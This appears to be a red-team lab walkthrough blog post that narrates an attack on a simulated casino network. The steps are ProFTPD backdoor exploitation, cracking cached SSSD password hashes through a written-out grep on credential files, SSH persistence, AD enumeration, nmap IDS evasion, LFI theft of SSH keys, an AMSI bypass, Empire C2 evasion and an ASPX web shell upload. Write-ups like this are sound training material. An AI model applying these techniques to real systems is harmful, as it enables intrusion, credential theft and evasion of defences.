<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-167.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>Placing your tools in a virtual environment can be quite powerful and helpful to keep everything neatly organized and functional without the need to break your OS with all the extra unnecessary packages that one tool might require. I advise looking at the IoT Methodology [6] to have an idea on how to approach attacking stuff like this.</p>
<p>[1] <a href="https://en.wikipedia.org/wiki/Metadata#:~:text=Metadata%20means%20%22data%20about%20data,working%20with%20specific%20data%20easier" class="inline-onebox" rel="noopener nofollow ugc">Metadata - Wikipedia</a>.</p>
<p>[2] <a href="https://www.oracle.com/internet-of-things/what-is-iot/" class="inline-onebox" rel="noopener nofollow ugc">What Is the Internet of Things (IoT)?</a></p>
<p>[3] <a href="https://raw.githubusercontent.com/krlsio/python/main/namemash.py" rel="noopener nofollow ugc">https://raw.githubusercontent.com/krlsio/python/main/namemash.py</a></p>
<p>[4] <a href="https://www.shodan.io/" rel="noopener nofollow ugc">https://www.shodan.io/</a></p>
<p>[5] <a href="https://github.com/smicallef/spiderfoot" class="inline-onebox" rel="noopener nofollow ugc">GitHub - smicallef/spiderfoot: SpiderFoot automates OSINT for threat intelligence and mapping your attack surface.</a></p>
<p>[6] <a href="https://github.com/inguardians/IoTA" class="inline-onebox" rel="noopener nofollow ugc">GitHub - inguardians/IoTA: The Internet of Things Attack (IoTA) Methodology</a></p>
<p>—-[ Initial Access ]—————————————————————————————————————</p>
<p>In 2017, the most creative casino [1] breach occurred in the US. Rather than employing sophisticated techniques like 0-day exploits, phishing, or polymorphic self-encrypting malware, the attackers took a simpler route: they accessed a fish tank thermometer. This Linux-based thermometer, connected to the internet is part of the Internet of Things (IoT), it was linked to the same network hosting the casino’s internal infrastructure. IOTs are a great for deployment and have its conveniences for the user but they also have problems[2] IOTs to my experience are still a vast pool of the unknown but amazing individuals have jumped and started looking into these potentially broken devices, now for this example we won’t need to go that far since Metasploit[3] has the sufficient functions for us to gain Initial Access starting with a port scan will locate services with potential vulnerabilities that can allow use to gain access.</p>
<p>There are multiple tools that we can utilize to achieve our goals, some of them are actually combined with well-known ones such as rustscan[4] or custom ones written in your favorite language but here I will be using some methods just for verification and demonstration that sometimes all these tools won’t be available and creativity is what would help here, our first method is using the popular port scanner nmap[5] which needs no introduction as it’s the most popular well known pentester/redteam/blueteam tool known to man now take a look at the output below:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-168.png?w=624" alt="" width="624" height="343" role="presentation"></p>
<p>Notice the detail of the scan, and the methods used such as the -sC (Safe Scripts) and -sV (Version) this information has been fingerprinted to be running on a OS: Ubuntu type but I want to show you this because we can’t just trust 1 tool or 1 method doesn’t matter how popular or useful it can be, always verify the information, QUESTION EVERYTHING[6] now another method I simply used the ncat tool to connect to a port, do some banner grabbing and confirm the port is actually open and reachable.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-169.png?w=624" alt="" width="624" height="270" role="presentation"></p>
<p>I’ve confirmed that the ports are open, and I can interact with them so I can proceed with more enumeration and proceed with some vulnerability scanning and check the possibilities of exploits available where I can gain my first access.</p>
<p>Now a common methodology is to start looking for low hanging fruit, or the quick wins for these methods, will start in a simple order from top to bottom, normally this is not the approach taken with more professional pentesters as they can tell by experience, the ports that might give them those quick wins. In this example it’s port 21 to locate potential exploits with an offline tool named searchsploit [7] a great terminal alternative to exploitdb which allows you to quickly access workable exploits and documentation offline.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-170.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I investigated this exploit by using the X flag. We can get more details about it if it’s available the info is usually inside the description of the exploit or sometimes, they contain a txt file that gives a more detailed description about the exploit.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-171.png?w=621" alt="" width="621" height="202" role="presentation"></p>
<p>So there seems to be a backdoor on this version of ProFTPD, if we read the module from Metasploit we can find out the backdoor command sent to ProFTPD to gain a root shell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-172.png?w=354" alt="" width="354" height="42" role="presentation"></p>
<p>Great now I’ve gained Initial Access onto the Casino’s Internal Network</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-173.png?w=624" alt="" width="624" height="99" role="presentation"></p>
<p>Now that I finally have Initial Access onto the network it’s time to get into more hacking, getting around the systems, reach domain admin, dump some credz, evade some defenses, some tricks to reach our goal. Since enumeration is always key to decide what’s our next step onto the network let’s work with Ubuntu here for some AD (Active Directory) enumeration, it’s a little tricky since most tools are mostly written for Windows environments, some people are unaware that Ubuntu can be added [8] to the AD as well! But before continuing let’s upgrade [9] our shell to have a more stable terminal interaction.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-174.png?w=440" alt="" width="440" height="126" role="presentation"></p>
<p>Perfect, moving forward should be a breeze, let’s check where we are and grab some info on the domain, locate some users, find any other computers on the AD a bunch to work on to reach our goal using the realm tool which is a tool needed to join an AD network with Ubuntu.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-175.png?w=358" alt="" width="358" height="352" role="presentation"></p>
<p>Let’s check for any local users finding these can also give us an idea on how the workflow is worked on, local accounts are a common thing for when a workstation is being set up for the first time , back in my IT days we’d have 1 local master account to add the AD infrastructure and necessities but the local master account was never removed or even changed to give it less permissions!!!. But oh well what can you do ¯_(ツ)_/¯</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-176.png?w=434" alt="" width="434" height="102" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-177.png?w=87" alt="" width="87" height="26" role="presentation"></p>
<p>Only one local user, now the interesting part is to enumerate the Active Directory now, but since we don’t hold credentials for our a domain user and some methods and tools require credentials I’ll need to locate a potential user first by using the “w” command we can see if there are any active users on the machine that may give us an idea of the users that are available, the time they logged in, IDLE time and much more information this can also point out the naming convention of the internal AD users.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-178.png?w=624" alt="" width="624" height="84" role="presentation"></p>
<p>Locating our first AD user with this helps us move forward now we can probably brute force usernames, locate more users, workstations and network connections to make sure that we can move laterally and if there’s an option to get around, but we need credentials since I don’t have much experience in locating hashes for the AD user in Ubuntu I had to do some research for this, in my scenario I found the hashes here:</p>
<pre><code class="lang-auto">grep -a "cachedPassword" /var/lib/sss/db/*
</code></pre>
<p>Using these hashes with hashcat we get a chance to crack these hashcat is a powerful tool for cracking passwords hashes with multiple options and features to help us achieve our goal of gaining cleartext credentials from a hash it’s simply a great tool to have in your arsenal, moving forward I used a command to lcoate me these hashes.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-179.png?w=437" alt="" width="437" height="22" role="presentation"></p>
<p>Once located you can pass the hash onto hashcat and attempt to crack it, the password here was successfully cracked since it was a combination of Season + Year which is a common combination of weak passwords. Don’t be afraid of trying simple and well known credentials, they are still really common. I like to use rules as well, and you should be using rules since they mutate the words to find potential passwords such as Password → P@$$w0rd.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-180.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>To proceed in enumerating the AD we need some information about where the DC is located, you can run an nmap scan internally and try to find it by checking out your output, but this could be quite noisy, I used the adcli[10] command-line tool to get this information as it’s another tool that comes installed in Linux machines that were joined in a domain:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-181.png?w=624" alt="" width="624" height="188" role="presentation"></p>
<p>Now the AD tools commonly use have been built for Windows environments but there are some great people out there that have built versions of these tools capable to run on Linux using python[11][12]but there are also built in tools in Linux that we can utilize such as LDAPSEARCH[13] the queries can be quite tricky and complicated to learn, so I do recommend testing these commands before running them to avoid crashing your shell and having a cheat sheet when you need to enumerate certain information on the domain</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-182.png?w=624" alt="" width="624" height="420" role="presentation"></p>
<p>On the screenshot above I enumerated the Domain Users seeing if I can find anything interesting such as finding passwords in the “Description Section” or users that belong to interesting groups, we can also look for SPN values that may allow us to use the Kerberoasting[14] attack and gain another users cleartext password but only experience will benefit us if we know some of the AD scenarios and techniques, if we are brand new to this only research will help us move forward. In the following screenshot I enumerated the available workstations</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-183.png?w=624" alt="" width="624" height="445" role="presentation"></p>
<p>In the above screenshot I am currently in the BCK-WKN1 workstation my goal is to move in this direction</p>
<pre><code class="lang-auto">BCK-WKN1 -&gt; BCK-WKN2 -&gt; GD-WKN1 -&gt; IT-WKN1
</code></pre>
<p>Now even though this output is great and all running tools on the host is kind of a “No, no” we may want to run a proxy onto the targeted workstation and run our custom tools with no issues of being detected in terms of local security products, since our tools are running in our controlled environment.</p>
<p>Before proceeding I should place persistence in case that my connection dies, the server reboots or any shenanigans since I am in a Linux machine my most comfortable course of action is to work with SSH by editing the configuration file I can allow it to use a private key for access instead of a password which I still don’t know, so on my attacker machine I should create a key:</p>
<pre><code class="lang-auto">ssh-keygen -t rsa -b 4096
</code></pre>
<p>When my key has been created, I can copy the id_rsa.pub key and copy its contents and place them in the remote workstation in a file named authorized_keys with that I can login using my private key that I’ve created on my attacking machine and login with a more stable terminal.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-184.png?w=450" alt="" width="450" height="153" role="presentation"></p>
<p>And now I have a more stable and fully functional terminal, I’ve learned to work with this method if you’ve played HackTheBox in the past you will find familiar techniques or resources that I’ll point to so you can try them yourself, I try to live in Open Source as possible to show you that not everything is a complicated tool or technique.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-185.png?w=624" alt="" width="624" height="321" role="presentation"></p>
<p>Now with persistence in place via SSH setting up a Dynamic Port Forwarding using the -D 9999 is my next step so I can pass my tools via proxy and gather information as I would from the remote host but this time not worrying about dependencies or other issues since they are pre-installed or fully functional from my host with pywerview [15] I gather Domain User information.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-186.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I saved the output to JSON and beautified it using the jq [16] tool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-187.png?w=624" alt="" width="530" height="499" role="presentation"></p>
<p>Searching for Domain Computers with pywerview should be quite simple and now I can focus on filtering out information I would like to gather, the project is quite interesting in the methods it uses for the information it queries, by utilizing LDAP to query this I would consider it a slightly more OPSEC friendly method to gather the information as other tools that use PowerShell or C# tend to use well known protocols and methods such as Windows APIs that’s why it’s a great skill to know you’re way around different Operating Systems</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-188.png?w=525" alt="" width="525" height="422" role="presentation"></p>
<p>For locating services and open ports running on computers in the internal network I will use the nmap port scanner to find potential attacks for moving laterally but I also want to consider the fact that I am being watched, nmap has great tools for spoofing, evasion and such that can help me scan these ports more quietly and still effective I targeted specific ports that I guessed should be opened on the network, here is the command I used:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-189.png?w=624" alt="" width="624" height="181" role="presentation"></p>
<p>A brief explanation on the commands I used below, I didn’t use all the options but do play around and experiment:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-190.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<pre><code class="lang-auto">-------------------------[Nmap]----------------------------------------------------

-f: The -f option causes the requested scan (including host discovery scans) to use tiny, fragmented IP packets. The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect what you are doing.

--script-args http.userganet: This option helps me change the default value of the header used for nmap when it's scanning I can pass by as an iPhone, Windows, Printer, Android any device I want to blend in with the network traffic instead of just sending a big red flag that says "Nmap Engine"

--randomize-hosts: I don't want to scan in order since you can tell that something is going on, on the network because a scan is being done from top to bottom but if you can make it look random you have a better chance to blend in

-D: Decoys are sent to the network to try and spoof the source of where the real port scanning is coming from

Do play around there are other great options such as slow scanning, changing the fragmented packet sizes use a source port to show that the port is coming from a legitimate source like port 80, experiment.

-------------------------[Nmap]----------------------------------------------------
</code></pre>
<p>I’ve located my next move which is BCK-WKN2 it’s time to restart my enumeration and follow the process again, looking for low-hanging fruits, vulnerability scanning, exploitation and so on:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-191.png?w=624" alt="" width="624" height="187" role="presentation"></p>
<p>Taking a quick look at port 80 since it has the most potential in terms of exploitation as internal web applications tend to be vulnerable to some serious exploits since they don’t have the development time for focusing on security, companies tend to ignore these facts just because “they aren’t facing the internet” but hey it’s good for us, a web application scanner I like to use as of lately is nuclei[17] a fast vulnerability scanner designed to probe modern applications, infrastructure, cloud platforms, and networks, aiding in the identification and mitigation of exploitable vulnerabilities, powerful tool that can be customized and add even more custom attacks, the templates are based on YAML so some work to get used to. The scan shown below demonstrates an LFI[18] vulnerability</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-192.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>[! WARNING]</p>
<p>Do be careful with using scanners on internal networks the default settings are usually running at high speeds sending multiple requests per second, if not careful you can crash the application and give yourself away.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-193.png?w=624" alt="" width="624" height="155" role="presentation"></p>
<p>Let’s look at the website and test this vulnerability manually we can use the web browser or do a simple curl command with the example given by nuclei.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-194.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-195.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>Seen above, notice the output from curl we can read files on the remote workstation, this gives us some potential stuff to look at and gain some access to the remote workstation.</p>
<p>[1] <a href="https://cyberhound.com/the-great-fish-tank-hack/" rel="noopener nofollow ugc">https://cyberhound.com/the-great-fish-tank-hack/</a></p>
<p>[2] <a href="https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/" rel="noopener nofollow ugc">https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/</a></p>
<p>[3] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[4] <a href="https://github.com/RustScan/RustScan" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RustScan/RustScan: 🤖 The Modern Port Scanner 🤖</a></p>
<p>[5] <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<p>[6] <a href="https://www.psychologytoday.com/us/blog/connect-creativity/201311/question-everything-everywhere-forever" class="inline-onebox" rel="noopener nofollow ugc">Question Everything, Everywhere, Forever | Psychology Today</a></p>
<p>[7] <a href="https://www.exploit-db.com/searchsploit" class="inline-onebox" rel="noopener nofollow ugc">Exploit Database SearchSploit Manual</a></p>
<p>[8] <a href="https://www.informaticar.net/join-ubuntu-22-04-to-microsoft-active-directory-domain/" class="inline-onebox" rel="noopener nofollow ugc">Join Ubuntu 22.04 to Microsoft Active Directory domain | IT Blog</a></p>
<p>[9] <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" class="inline-onebox" rel="noopener nofollow ugc">Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</a></p>
<p>[10] <a href="https://manpages.ubuntu.com/manpages/trusty/man8/adcli.8.html" class="inline-onebox" rel="noopener nofollow ugc">Ubuntu Manpage: adcli - Tool for performing actions on an Active Directory domain</a></p>
<p>[11] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[12] <a href="https://github.com/SecuProject/ADenum?tab=readme-ov-file" class="inline-onebox" rel="noopener nofollow ugc">GitHub - SecuProject/ADenum: AD Enum is a pentesting tool that allows to find misconfiguration through the the protocol LDAP and exploit some of those weaknesses with kerberos.</a></p>
<p>[13] <a href="https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html" class="inline-onebox" rel="noopener nofollow ugc">The ldapsearch Command-Line Tool</a></p>
<p>[14] <a href="https://www.crowdstrike.com/cybersecurity-101/kerberoasting/" class="inline-onebox" rel="noopener nofollow ugc">What is a Kerberoasting Attack? â CrowdStrike</a></p>
<p>[15] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[16] <a href="https://jqlang.github.io/jq/" class="inline-onebox" rel="noopener nofollow ugc">jq</a></p>
<p>[17] <a href="https://docs.projectdiscovery.io/tools/nuclei/overview" class="inline-onebox" rel="noopener nofollow ugc">Nuclei Overview - ProjectDiscovery Documentation</a></p>
<p>[18] <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" class="inline-onebox" rel="noopener nofollow ugc">WSTG - v4.2 | OWASP Foundation</a></p>
<p>—-[ Deeper in the Network ]————————————————————————————————–</p>
<p>With LFI as our potential lateral movement technique to move deeper onto the network we have to use this in our advantage to gain access to the remote host, now remember previously the SSH port, this tells us as attackers that there is an SSH server running and probably a potential way to access this host, with our previous enumeration using pywerview I can grab a list of domain users and start brute forcing for interesting files in their home directory folders since we are aware that SSH is running I’ll start looking for SSH related files, I do want to mention another potential tool for this is netexec[1] with multiple protocols and modules available for us to work with, we could potentially locate different paths to gain access or maybe just simple enumeration as seen below where I grab usernames:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-196.png?w=624" alt="" width="624" height="137" role="presentation"></p>
<p>Now with this user list I’ll build a small pythons script to locate interesting files like public, or private SSH keys which we will find using this vulnerability it’s a valuable skill to try and automate some things by utilizing languages such as python or scripting languages such as BASH using the tools manually is great as well but if you really want to make your life easy when hacking or trying to reach the same spot again automation is the recommended way, now below we see the script at work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-197.png?w=624" alt="" width="539" height="500" role="presentation"></p>
<p>With jnovoa’s private SSH key I use it to login onto the workstation these SSH connections if set up with default values they give the user Administrator Privileges onto the workstation, of course this only applied if the user is in the local Administrator group</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-198.png?w=624" alt="" width="624" height="127" role="presentation"></p>
<p>Now that we are currently in this windows workstation we can move onto utilizing our C2 framework for a more dedicated attack using a payload with all our tools loaded we do have to be careful to edit and customize this as much as possible to leave a different fingerprint than the already known ones from Empire for example take a look at the following payload, you will notice a detection but not based on signature but behavior since detection’s are commonly done via static, behavior and heuristics we do have to consider what is being detected and why:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-199.png?w=624" alt="" width="624" height="430" role="presentation"></p>
<p>Since the method of behavior was at fault, I do want to apply some evasions that can aid in avoiding detection’s when I am trying my PowerShell agents, especially since they come in a command-line method where I need to copy and paste the command onto the terminal my first approach is trying to avoid any static detection’s in this case it’s AMSI.</p>
<p>Now since I am running purely with PowerShell, I like to use some tools for AMSI String detection most of these bypass work by obfuscating strings that trigger AMSI when running here is a simple example of this behavior or method of detection quite simple and yet effective to understand some AV products.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-200.png?w=624" alt="" width="624" height="108" role="presentation"></p>
<p>Literally just a word and received a flag by Defender and AMSI telling me this is malicious but if we apply some slight obfuscation, I can use the word with no warnings whatsoever:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-201.png?w=501" alt="" width="501" height="96" role="presentation"></p>
<p>Now we want to apply a “patch” to AMSI to avoid these triggers, the way this works is that if we can tell AMSI that all the strings being passed to it are Benign then everything will be ignored by AMSI, the patch I’ll be working with is one by Adam Chester[2] so here is the patch[3] but of course this out the box is going to get flagged so I like to test it with AMSITRIGGER[4]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-202.png?w=381" alt="" width="381" height="135" role="presentation"></p>
<p>Looking at this output seems that the bad word here is AMSI now the file is using C# embedded in a PowerShell script since PowerShell can interact with the CLR which runs C# I can actually use obfuscation techniques meant for C# so now I will base64 this string and decode it on the fly.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-203.png?w=624" alt="" width="624" height="16" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-213.png?w=422" alt="" width="422" height="126" role="presentation"></p>
<p>Now with the method above I utilized a Base64 Decoding method native to C# and encoded the malicious string, this time now the file is flagged as malicious but executing still causes problems:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-214.png?w=624" alt="" width="624" height="388" role="presentation"></p>
<p>The cat and mouse game, now all the tools even Defender tells me it’s ok but remember since there is no execution Defender can’t check or analyze it via behavior so this will need to execute to give it a different type of scanning method, since this is the theory I’m working on, one method I like to try instead of running the script using IEX and such I like to copy/paste the entire script since I would like to think that Defender is thinking that these are just regular commands run by a user but it’s me guessing that, that’s what’s going on, this is only possible because I have a full terminal that I can access and paste these commands onto the terminal:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-215.png?w=624" alt="" width="624" height="77" role="presentation"></p>
<p>Now this time the malicious strings are no longer being flagged but errors are now shown this is good as it means that any malicious word doesn’t kill my payload or cause a detection, PowerShell just thinks it’s a functions or some sort of operable program to execute. Now from here we can move on and capture our first working agent from Empire:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-216.png?w=624" alt="" width="624" height="238" role="presentation"></p>
<p>Now here I’ve shown how to avoid the static string detection, but we were talking about behavior based, since this scenario requires a lot of tinkering all I can give here is advise on what one can do for evading these detection’s I’ll explain some of these in parts</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-217.png?w=624" alt="" width="624" height="47" role="presentation"></p>
<p>The Malleable profile is the network traffic that will be used to spoof and blend in our C2 to agent communication this needs to make sense in a way we don’t want to give ourselves away by using strange traffic like a bogus website that just go up and running and it just so happens to communicate inside this network only.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-218.png?w=624" alt="" width="624" height="48" role="presentation"></p>
<p>If possible use Certificates for your traffic this makes it look more legitimate in current times https traffic uses certs to encrypt the network traffic this helps in the case of making it look like legitimate https traffic just because of the simple fact that it is signed, the cert can be self-signed and still be ignored in some cases.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-219.png?w=624" alt="" width="624" height="50" role="presentation"></p>
<p>The working hours is a setting that avoids your agent to speak out to your C2 server when you aren’t even on it yourself, that way you can avoid weird network requests at odd hours of work. Mostly these configurations come within Empire itself but the profile [5] can accept custom settings as well.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-220.png?w=244" alt="" width="244" height="102" role="presentation"></p>
<p>The spawning process, the sleep time, the jitter, the pipe names used for SMB listeners and more diving deeper into the profiles will help you avoid detection’s as well, play with them and try some creative stuff on your own [6][7].</p>
<p>Perfect now from here we can start grabbing more info, look for potential passwords, interesting files, the whole 9 yards to grab as much as possible from the host, now some things I personally like to take a look at are processes and the security product we are going up against, Empire has modules that can be utilized to execute in memory from the current or any live agents that we have for example the antivirus module to locate the security product running:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-221.png?w=624" alt="" width="624" height="453" role="presentation"></p>
<p>And the output is as follows:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-222.png?w=624" alt="" width="624" height="209" role="presentation"></p>
<p>I just ran this to verify other security products weren’t on the host, but since my payloads worked It is highly unlikely that was the case because if it were EDR or some other layer of security getting around it would have been trickier.</p>
<p>I want to also take some time to look for interesting files, processes anything that might give me an idea on what’s going on the network Empire has useful modules for this type of approach a built in SauronEye module an interesting C# tool built for fast searches built into Empire utilizing PowerShell</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-223.png?w=624" alt="" width="624" height="475" role="presentation"></p>
<p>I do however disable the search file contents as this will take more time and resources, also this would be noisy when something trying to read files at a high speed but once that is settled I can check the files manually by downloading them individually.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-224.png?w=624" alt="" width="624" height="301" role="presentation"></p>
<p>I’ve downloaded the file for analysis and just viewed a report on the Casino’s winnings since the files are within the docker you need to copy them locally [8]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-225.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Since the file was contained in a docker I have to copy[5] the file from it into my local station, take some time to explore the environment you would be surprised on the stuff you would find passwords, keys, databases, PII the list goes on and on tools like Empire, some C# other’s in PowerShell, Nim, Go the possibilities are endless give them a try and look for yourself you might find quick wins, <em>COUGH</em> “Passwords.xlsx” <em>COUGH</em></p>
<p>[1] <a href="https://www.netexec.wiki/" rel="noopener nofollow ugc">https://www.netexec.wiki/</a></p>
<p>[2] <a href="https://twitter.com/_xpn_" rel="noopener nofollow ugc">https://twitter.com/_xpn_</a></p>
<p>[3] <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#adam-chester-patch" class="inline-onebox" rel="noopener nofollow ugc">GitHub - S3cur3Th1sSh1t/Amsi-Bypass-Powershell: This repo contains some Amsi Bypass methods i found on different Blog Posts.</a></p>
<p>[4] <a href="https://github.com/RythmStick/AMSITrigger" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RythmStick/AMSITrigger: The Hunt for Malicious Strings</a></p>
<p>[5] <a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/gmail.profile" class="inline-onebox" rel="noopener nofollow ugc">Malleable-C2-Profiles/Normal/gmail.profile at master · BC-SECURITY/Malleable-C2-Profiles · GitHub</a></p>
<p>[6] <a href="https://github.com/Tylous/SourcePoint" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Tylous/SourcePoint: SourcePoint is a C2 profile generator for Cobalt Strike command and control servers designed to ensure evasion.</a></p>
<p>[7] <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/" rel="noopener nofollow ugc">https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/</a></p>
<p>[8] <a href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host" class="inline-onebox" rel="noopener nofollow ugc">Copying files from Docker container to host - Stack Overflow</a></p>
<p>—-[Enumeration]—————————————————————————————————————</p>
<p>I need to locate my next host and potential access to it, since staying locally is no longer necessary as I am Administrator Privileges from the SHH connection we can start looking for potential AD attacks such as Unconstrained Delegation, Constrained Delegation, Kerberoasting, AS-REPRoasting, Shadow Credentials, Active Directory Certificate Services and others but my enumeration actually didn’t point me anything crazy as such I did locate AS-REP but it was for a user I already hold with access to nowhere else now port scans are rare on internal networks specially since they tend to be very noisy, but sometimes with a little bit of creativity and time we can actually gather good information as I did previously using nmap via proxychains but now I don’t need that amount of info yet and Empire has a built in port-scanner in PowerShell running the module shows me interesting output.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-226.png?w=410" alt="" width="410" height="156" role="presentation"></p>
<p>Having the open port information lets me apply a targeted scan to wat information I want to gather this way I am not guessing and trying multiple ports at a time and only focusing my information gathering at the openly available ones in this case port 80 and 445 are the most interesting ones, I’ve utilized the same methods as previously with nmap to avoid detection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-227.png?w=624" alt="" width="624" height="478" role="presentation"></p>
<p>The HTTP protocol and the well known port 445 SMB running on a Windows 7 machine potentially vulnerable to the Eternablue[1] exploit are the interesting ones I’ll take the approach at looking at port 80 but remember the port isn’t open to the internet so setting up a reverse proxy onto the Browser should be a potential next step this time I will setup a Local Port forward with SSH since I know the target server and the port I am trying to reach I can tell SSH to do that with the “-L” flag:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-228.png?w=624" alt="" width="624" height="31" role="presentation"></p>
<p>Now I can reach the HTTP server from my local machine as the request will be forwarded to this location, my next step is to utilize a directory brute force technique I am aware the service is running on Microsoft IIS but I only know the existence of the main page, these tend to contain a directory only known to the internal employees but the “vulnerability” here is that these directories tend to have common or well-known names such for example: secret, uploads, admin, configuration and so on. A tool popular for this well-known technique is feroxbuster [2] a popular directory tool written in Rust, it has tons of great features but will be focusing on a few ones that I know won’t crash the server and gives us sufficient information to look for:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-229.png?w=624" alt="" width="624" height="64" role="presentation"></p>
<pre><code class="lang-auto">----[FeroxBuster]-------------------------------------------------------------------

--depth 1: This tells feroxbuster to only go 1 level deep in the directory scanning

--auto-bail: If feroxbuster encounters multiple errors then stop

--silent: I don't want all the output just the directories found

-x: The extensions I want to apply to the words in the wordlist, experience and some documentation will allow you to recognize the type of file types accepted on the HTTP Service running

-A: Use a random user Agent when scanning to avoid some detection

-w: The wordlist I want to use in the directory scanning

----[FeroxBuster]----------------------------------------------------------------
</code></pre>
<p>The previous output shows me that an uploads and uploads.html directory have been found one is empty but the other one actually gives me the option to upload files, now the trick here is to utilize a compatible web shell to run on a window workstation since we are aware ASPX files are utilized we can actually take advantage of this language usually Linux distros that are for pentesting or offensive development contain some great examples to utilize for web shells but these can be found on the internet as well just be careful for backdoors as you don’t want to hack yourself</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-230.png?w=389" alt="" width="389" height="99" role="presentation"></p>
<p>Let’s try uploading our payload, now that we have the directory to upload and the directory where the uploads go to, we can interact with our uploaded payload.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-231.png?w=624" alt="" width="624" height="286" role="presentation"></p>
<p>I’ve uploaded an aspx file webshell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-232.png?w=527" alt="" width="527" height="328" role="presentation"></p>
